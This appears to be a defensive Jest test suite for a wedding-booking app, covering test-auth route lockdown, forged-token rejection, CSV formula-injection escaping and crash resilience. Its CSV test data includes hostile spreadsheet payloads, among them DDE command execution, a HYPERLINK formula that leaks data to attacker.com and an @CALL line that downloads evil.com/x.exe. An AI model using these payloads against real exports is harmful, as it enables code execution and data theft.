/**
 * __tests__/lib/challenger-m1-adversarial.test.ts
 *
 * EMPIRICAL ADVERSARIAL CHALLENGE SUITE FOR MILESTONE 1
 *
 * Stress-tests:
 * 1. SEC-01: Hostile bypass attempts on isE2ETestAuthEnabled() & /api/test/auth under extensive env matrices,
 *    tampered tokens, forged HMACs, malformed inputs, and expired timestamps.
 * 2. SEC-02: CSV formula injection neutralization with adversarial payloads:
 *    - All prefix combinations (=, +, -, @, \t, \r, \n, spaces, mixed tabs/newlines)
 *    - Complex DDE/calc/hyperlink payloads
 *    - RFC 4180 quote escaping and multi-line integrity
 *    - Unicode and boundary edge cases
 * 3. OPS-01: Server Process Resilience on unhandledRejection:
 *    - Error instances, primitive strings, null/undefined, circular references
 *    - Non-termination of event loop / process liveness
 */

import {
  isE2ETestAuthEnabled,
  createE2ETestSessionToken,
  verifyE2ETestSessionToken,
} from "@/lib/test-auth";
import { GET as testAuthGET, POST as testAuthPOST } from "@/app/api/test/auth/route";
import { GET as hostReportGET } from "@/app/api/reports/host/[weddingId]/route";
import { logger } from "@/lib/logger";
import { NextRequest } from "next/server";
import { UserRole } from "@prisma/client";
import crypto from "crypto";

// Mock Prisma
jest.mock("@/lib/prisma", () => ({
  prisma: {
    user: {
      findUnique: jest.fn(),
      findFirst: jest.fn(),
    },
    wedding: {
      findUnique: jest.fn(),
    },
    booking: {
      findMany: jest.fn(),
    },
    auditLog: {
      create: jest.fn().mockResolvedValue({ id: "log_mock" }),
    },
  },
  isDatabaseAvailable: jest.fn().mockResolvedValue(true),
}));

// Mock Auth for routes where needed
jest.mock("@/lib/auth", () => {
  const actual = jest.requireActual("@/lib/auth");
  return {
    ...actual,
    requireAuth: jest.fn(),
    requireRole: jest.fn(),
  };
});

const { prisma } = jest.requireMock("@/lib/prisma");
const { requireAuth } = jest.requireMock("@/lib/auth");

describe("ADVERSARIAL CHALLENGE: Milestone 1 (SEC-01, SEC-02, OPS-01)", () => {
  const originalEnv = process.env.NODE_ENV;
  const originalPlaywright = process.env.PLAYWRIGHT_TEST;

  afterEach(() => {
    (process.env as any).NODE_ENV = originalEnv;
    if (originalPlaywright !== undefined) {
      process.env.PLAYWRIGHT_TEST = originalPlaywright;
    } else {
      delete process.env.PLAYWRIGHT_TEST;
    }
    jest.clearAllMocks();
  });

  // =========================================================================
  // 1. SEC-01 ADVERSARIAL MATRIX & HOSTILE BYPASS ATTEMPTS
  // =========================================================================
  describe("1. SEC-01 Hostile Bypass Stress Testing", () => {
    const hostileEnvMatrix = [
      { nodeEnv: "production", playwright: "true", expected: false, desc: "Production with PLAYWRIGHT_TEST=true" },
      { nodeEnv: "production", playwright: "1", expected: false, desc: "Production with PLAYWRIGHT_TEST=1" },
      { nodeEnv: "production", playwright: "yes", expected: false, desc: "Production with PLAYWRIGHT_TEST=yes" },
      { nodeEnv: "production", playwright: undefined, expected: false, desc: "Production with no PLAYWRIGHT_TEST" },
      { nodeEnv: "development", playwright: "true", expected: false, desc: "Development with PLAYWRIGHT_TEST=true" },
      { nodeEnv: "development", playwright: undefined, expected: false, desc: "Development with no PLAYWRIGHT_TEST" },
      { nodeEnv: "staging", playwright: "true", expected: false, desc: "Staging with PLAYWRIGHT_TEST=true" },
      { nodeEnv: "test", playwright: undefined, expected: false, desc: "Test with PLAYWRIGHT_TEST undefined" },
      { nodeEnv: "test", playwright: "false", expected: false, desc: "Test with PLAYWRIGHT_TEST=false" },
      { nodeEnv: "test", playwright: "0", expected: false, desc: "Test with PLAYWRIGHT_TEST=0" },
      { nodeEnv: "test", playwright: "TRUE", expected: false, desc: "Test with uppercase PLAYWRIGHT_TEST=TRUE" },
      { nodeEnv: "test", playwright: " true ", expected: false, desc: "Test with padded PLAYWRIGHT_TEST=' true '" },
      { nodeEnv: "test", playwright: "true", expected: true, desc: "Test with strictly exact PLAYWRIGHT_TEST='true'" },
    ];

    test.each(hostileEnvMatrix)("Matrix: $desc -> enabled: $expected", ({ nodeEnv, playwright, expected }) => {
      (process.env as any).NODE_ENV = nodeEnv;
      if (playwright === undefined) {
        delete process.env.PLAYWRIGHT_TEST;
      } else {
        process.env.PLAYWRIGHT_TEST = playwright;
      }

      expect(isE2ETestAuthEnabled()).toBe(expected);
    });

    it("SEC-01 Hostile Attack: GET /api/test/auth in production returns 404 without setting cookie or querying DB", async () => {
      (process.env as any).NODE_ENV = "production";
      process.env.PLAYWRIGHT_TEST = "true"; // Attacker tries to set header/env

      const req = new NextRequest("http://localhost:3000/api/test/auth?role=ADMIN&redirect=/admin");
      const res = await testAuthGET(req);

      expect(res.status).toBe(404);
      const body = await res.json();
      expect(body).toEqual({ error: "Not found" });
      expect(res.cookies.get("__wwi_e2e_session")).toBeUndefined();
      expect(prisma.user.findFirst).not.toHaveBeenCalled();
    });

    it("SEC-01 Hostile Attack: POST /api/test/auth in production returns 404 without setting cookie or querying DB", async () => {
      (process.env as any).NODE_ENV = "production";
      process.env.PLAYWRIGHT_TEST = "true";

      const req = new NextRequest("http://localhost:3000/api/test/auth", {
        method: "POST",
        body: JSON.stringify({ role: "ADMIN", email: "victim@target.com" }),
        headers: { "Content-Type": "application/json" },
      });
      const res = await testAuthPOST(req);

      expect(res.status).toBe(404);
      const body = await res.json();
      expect(body).toEqual({ error: "Not found" });
      expect(res.cookies.get("__wwi_e2e_session")).toBeUndefined();
      expect(prisma.user.findFirst).not.toHaveBeenCalled();
    });

    it("SEC-01 Token Adversarial Verification: rejects forged HMAC signatures with wrong secret", () => {
      const validToken = createE2ETestSessionToken("admin_user_id", "ADMIN", "admin@domain.com");
      const [base64Data] = validToken.split(".");

      // Attacker creates signature using their own secret
      const forgedSig = crypto
        .createHmac("sha256", "attacker-secret-key-123456")
        .update(base64Data)
        .digest("base64url");
      const forgedToken = `${base64Data}.${forgedSig}`;

      expect(verifyE2ETestSessionToken(forgedToken)).toBeNull();
    });

    it("SEC-01 Token Adversarial Verification: rejects expired session tokens", () => {
      const expiredPayload = {
        userId: "hacker_user",
        role: "ADMIN",
        email: "hacker@test.com",
        expiresAt: Date.now() - 5000, // Expired 5 seconds ago
      };
      const secret = process.env.E2E_AUTH_SECRET || "e2e-secret-key-wedding-with-india-dev-test-only";
      const base64Data = Buffer.from(JSON.stringify(expiredPayload), "utf-8").toString("base64url");
      const signature = crypto.createHmac("sha256", secret).update(base64Data).digest("base64url");
      const expiredToken = `${base64Data}.${signature}`;

      expect(verifyE2ETestSessionToken(expiredToken)).toBeNull();
    });

    it("SEC-01 Token Adversarial Verification: rejects malformed, segmented, and injected payloads", () => {
      const secret = process.env.E2E_AUTH_SECRET || "e2e-secret-key-wedding-with-india-dev-test-only";

      // 1. Missing userId
      const noUserId = Buffer.from(JSON.stringify({ role: "ADMIN", expiresAt: Date.now() + 10000 })).toString("base64url");
      const sig1 = crypto.createHmac("sha256", secret).update(noUserId).digest("base64url");
      expect(verifyE2ETestSessionToken(`${noUserId}.${sig1}`)).toBeNull();

      // 2. Non-JSON string
      const nonJson = Buffer.from("NOT_A_JSON_STRING", "utf-8").toString("base64url");
      const sig2 = crypto.createHmac("sha256", secret).update(nonJson).digest("base64url");
      expect(verifyE2ETestSessionToken(`${nonJson}.${sig2}`)).toBeNull();

      // 3. More than 2 segments (tampering / injection)
      expect(verifyE2ETestSessionToken("part1.part2.part3")).toBeNull();
      expect(verifyE2ETestSessionToken("part1")).toBeNull();
      expect(verifyE2ETestSessionToken(".")).toBeNull();
      expect(verifyE2ETestSessionToken("")).toBeNull();
      expect(verifyE2ETestSessionToken(null as any)).toBeNull();
      expect(verifyE2ETestSessionToken(undefined as any)).toBeNull();
      expect(verifyE2ETestSessionToken(12345 as any)).toBeNull();
    });
  });

  // =========================================================================
  // 2. SEC-02 CSV FORMULA INJECTION ADVERSARIAL STRESS TESTING
  // =========================================================================
  describe("2. SEC-02 CSV Formula Injection Adversarial Stress Testing", () => {
    // Reference escape function from the route and admin action
    const escapeCsv = (value: unknown) => {
      if (value === null || value === undefined) return '""';
      let str = String(value);
      const trimmed = str.trimStart();
      const dangerousChars = ["=", "+", "-", "@", "\t", "\r"];
      if (
        dangerousChars.some((ch) => str.startsWith(ch)) ||
        (trimmed.length > 0 && dangerousChars.some((ch) => trimmed.startsWith(ch)))
      ) {
        str = `'${str}`;
      }
      return `"${str.replace(/"/g, '""')}"`;
    };

    const adversarialCsvPayloads = [
      // Standard formula execution prefixes
      { name: "Direct equals formula", input: "=1+1", expectedStarts: "\"'=1+1\"" },
      { name: "DDE execution exploit", input: "=cmd|' /C calc'!A0", expectedStarts: "\"'=cmd|' /C calc'!A0\"" },
      { name: "Hyperlink exfiltration", input: '=HYPERLINK("http://attacker.com?leak="&A1,"Click")', expectedStarts: "\"'=HYPERLINK(\"\"http://attacker.com?leak=\"\"&A1,\"\"Click\"\")\"" },
      { name: "Plus sign arithmetic", input: "+2+5", expectedStarts: "\"'+2+5\"" },
      { name: "Plus sign phone number", input: "+91-9876543210", expectedStarts: "\"'+91-9876543210\"" },
      { name: "Minus sign formula", input: "-SUM(1+2)", expectedStarts: "\"'-SUM(1+2)\"" },
      { name: "At sign formula", input: "@SUM(10,20)", expectedStarts: "\"'@SUM(10,20)\"" },

      // Leading whitespace evasion techniques
      { name: "Leading tab with formula", input: "\t=cmd|' /C calc'!A0", expectedStarts: "\"'\t=cmd|' /C calc'!A0\"" },
      { name: "Multiple leading tabs", input: "\t\t\t+1234", expectedStarts: "\"'\t\t\t+1234\"" },
      { name: "Leading carriage return", input: "\r=1+1", expectedStarts: "\"'\r=1+1\"" },
      { name: "Leading CRLF with formula", input: "\r\n=cmd|' /C calc'!A0", expectedStarts: "\"'\r\n=cmd|' /C calc'!A0\"" },
      { name: "Leading spaces with formula", input: "   =SUM(A1:A10)", expectedStarts: "\"'   =SUM(A1:A10)\"" },
      { name: "Mixed tabs, spaces, CR", input: " \t \r =2*3", expectedStarts: "\"' \t \r =2*3\"" },
      { name: "Leading newline with formula", input: "\n=1+1", expectedStarts: "\"'\n=1+1\"" },

      // Combinations of quotes and formula characters
      { name: "Formula containing quotes", input: '=IF(1=1,"YES","NO")', expectedStarts: "\"'=IF(1=1,\"\"YES\"\",\"\"NO\"\")\"" },
      { name: "Formula starting with @ and quotes", input: '@CALL("urlmon","URLDownloadToFileA","jjccbb",0,"https://evil.com/x.exe","C:\\x.exe",0,0)', expectedStarts: "\"'@CALL(\"\"urlmon\"\",\"\"URLDownloadToFileA\"\",\"\"jjccbb\"\",0,\"\"https://evil.com/x.exe\"\",\"\"C:\\x.exe\"\",0,0)\"" },

      // Safe values (must not be mangled with single quote prefix unless starting with dangerous char)
      { name: "Safe regular text", input: "Royal Wedding in Jaipur", expectedStarts: '"Royal Wedding in Jaipur"' },
      { name: "Safe number", input: 250000, expectedStarts: '"250000"' },
      { name: "Safe zero", input: 0, expectedStarts: '"0"' },
      { name: "Safe empty string", input: "", expectedStarts: '""' },
      { name: "Safe null", input: null, expectedStarts: '""' },
      { name: "Safe undefined", input: undefined, expectedStarts: '""' },
      { name: "Safe Unicode / Hindi", input: "शाही शादी जयपुर", expectedStarts: '"शाही शादी जयपुर"' },
      { name: "Safe dietary string", input: "Strict Veg, Nut Allergies (Peanuts)", expectedStarts: '"Strict Veg, Nut Allergies (Peanuts)"' },
    ];

    test.each(adversarialCsvPayloads)("SEC-02 Sanitizer: $name -> sanitized properly", ({ input, expectedStarts }) => {
      const sanitized = escapeCsv(input);
      expect(sanitized).toBe(expectedStarts);
      // Ensure the cell is fully quoted per RFC 4180
      expect(sanitized.startsWith('"')).toBe(true);
      expect(sanitized.endsWith('"')).toBe(true);
    });

    it("SEC-02 Host Catering Export Integration: neutralizes hostile multi-vector payload", async () => {
      requireAuth.mockResolvedValueOnce({ id: "host_couple_1", role: UserRole.COUPLE });
      prisma.wedding.findUnique.mockResolvedValueOnce({
        id: "w_hostile_1",
        slug: "hostile-test-wedding",
        hostCouple: { userId: "host_couple_1" },
        bookings: [
          {
            id: "=DDE(\"cmd\";\"/C calc\";\"__DDE__\")",
            traveler: {
              fullName: "\t=cmd|' /C notepad.exe'!A0",
              foodPreferences: "Jain",
            },
            travelDetails: {
              dietaryRequirements: "  \r\n  +1-800-MALICIOUS | Severe Celiac",
            },
            guests: [
              { fullName: "@AdminExfiltrate", foodPreference: "-SUM(100+200)" },
            ],
            guestsCount: 2,
            totalAmount: 50000,
            status: "=@CONFIRMED",
            createdAt: new Date("2026-10-10"),
          },
        ],
      });

      const req = new NextRequest("http://localhost:3000/api/reports/host/w_hostile_1");
      const res = await hostReportGET(req, { params: Promise.resolve({ weddingId: "w_hostile_1" }) });

      expect(res.status).toBe(200);
      const csv = await res.text();

      // Check each field has been neutralized:
      expect(csv).toContain("\"'=DDE(\"\"cmd\"\";\"\"/C calc\"\";\"\"__DDE__\"\")\"");
      expect(csv).toContain("\"'\t=cmd|' /C notepad.exe'!A0\"");
      expect(csv).toContain("\"'=@CONFIRMED\"");
      // Composite notes is safely encapsulated in quotes starting with "Primary: ..."
      expect(csv).toContain("\"Primary:   \r\n  +1-800-MALICIOUS | Severe Celiac | Accompanying: @AdminExfiltrate (-SUM(100+200))\"");
    });

    it("SEC-02 Host Catering Export Integration: single-guest formula in dietary notes gets escaped with single quote", async () => {
      requireAuth.mockResolvedValueOnce({ id: "host_couple_2", role: UserRole.COUPLE });
      prisma.wedding.findUnique.mockResolvedValueOnce({
        id: "w_hostile_2",
        slug: "single-guest-formula",
        hostCouple: { userId: "host_couple_2" },
        bookings: [
          {
            id: "b_single_1",
            traveler: { fullName: "Alice", foodPreferences: "=cmd|' /C calc'!A0" },
            travelDetails: null, // fallback to foodPreferences
            guests: [],
            guestsCount: 1,
            totalAmount: 1000,
            status: "PAID",
            createdAt: new Date("2026-10-10"),
          },
        ],
      });

      const req = new NextRequest("http://localhost:3000/api/reports/host/w_hostile_2");
      const res = await hostReportGET(req, { params: Promise.resolve({ weddingId: "w_hostile_2" }) });

      expect(res.status).toBe(200);
      const csv = await res.text();
      // Single guest direct fallback starting with = gets escaped
      expect(csv).toContain("\"'=cmd|' /C calc'!A0\"");
    });
  });

  // =========================================================================
  // 3. OPS-01 UNHANDLED REJECTION SERVER RESILIENCE STRESS TESTING
  // =========================================================================
  describe("3. OPS-01 unhandledRejection Server Process Resilience", () => {
    let exitSpy: jest.SpyInstance;
    let loggerErrorSpy: jest.SpyInstance;

    beforeEach(() => {
      exitSpy = jest.spyOn(process, "exit").mockImplementation((() => {}) as any);
      loggerErrorSpy = jest.spyOn(logger, "error").mockImplementation(() => {});
    });

    afterEach(() => {
      exitSpy.mockRestore();
      loggerErrorSpy.mockRestore();
    });

    it("OPS-01: unhandledRejection handler safely catches diverse rejection types without process termination", () => {
      // Simulate the exact handler in instrumentation.ts
      const handler = (reason: unknown) => {
        logger.error(
          "Unhandled Promise Rejection detected - server process liveness maintained",
          {
            type: "unhandledRejection",
            reason: reason instanceof Error ? reason.message : String(reason),
          },
          reason instanceof Error ? reason : new Error(String(reason))
        );
      };

      process.on("unhandledRejection", handler);

      try {
        const rejectionSamples = [
          new Error("Background telemetry push failed"),
          new TypeError("Cannot read properties of undefined"),
          "String-based rejection payload",
          { custom: "Object rejection without Error wrapper" },
          12345,
          null,
          undefined,
        ];

        for (const sample of rejectionSamples) {
          process.emit("unhandledRejection" as any, sample, Promise.reject(sample).catch(() => {}));
        }

        // Process.exit must NEVER have been called for any rejection
        expect(exitSpy).not.toHaveBeenCalled();
        // Logger.error must have been invoked for each rejection
        expect(loggerErrorSpy).toHaveBeenCalledTimes(rejectionSamples.length);
      } finally {
        process.removeListener("unhandledRejection", handler);
      }
    });

    it("OPS-01: handles circular reference rejection objects without throwing or crashing", () => {
      const handler = (reason: unknown) => {
        logger.error(
          "Unhandled Promise Rejection detected - server process liveness maintained",
          {
            type: "unhandledRejection",
            reason: reason instanceof Error ? reason.message : String(reason),
          },
          reason instanceof Error ? reason : new Error(String(reason))
        );
      };

      process.on("unhandledRejection", handler);

      try {
        const circularObj: any = { name: "Circular Error Object" };
        circularObj.self = circularObj;

        expect(() => {
          process.emit("unhandledRejection" as any, circularObj, Promise.reject(circularObj).catch(() => {}));
        }).not.toThrow();

        expect(exitSpy).not.toHaveBeenCalled();
        expect(loggerErrorSpy).toHaveBeenCalledWith(
          "Unhandled Promise Rejection detected - server process liveness maintained",
          {
            type: "unhandledRejection",
            reason: "[object Object]",
          },
          expect.any(Error)
        );
      } finally {
        process.removeListener("unhandledRejection", handler);
      }
    });
  });
});
